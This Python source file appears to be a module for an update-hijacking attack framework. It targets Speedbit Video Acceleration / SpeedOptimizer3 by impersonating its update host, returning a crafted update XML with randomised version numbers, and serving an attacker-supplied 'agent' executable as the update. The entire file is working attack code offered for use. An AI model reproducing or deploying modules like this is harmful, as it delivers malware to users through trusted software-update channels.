from modules import ModuleBase


class SpeedbitVideo(ModuleBase):
    name = 'Speedbit Video Acceleration / SpeedOptimizer3'
    version = '1.1'
    appver = '< 2.2.1.8 | 3.0'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = 'online.speedbit.com'
    options = {
        'version': {
            'val' : "'9.' + rand_num(1) + '.' + rand_num(1) + '.' + rand_num(1) + '.' + rand_num(1)",
            'hidden': 1,
            'dynamic': 1,
        },
        'url': {
            'val' : "'http://online.speedbit.com/speedbitupdate' + rand_alpha(rand_num(1)) + '.exe'",
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [
        {   'path': 'online/update.aspx',
            'type': 'file',
            'method': '',
            'bin': '0',
            'string' : "",
            'parse': '1',
            'file': './include/speedbit/speedbit_update.xml',
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        }
    ]

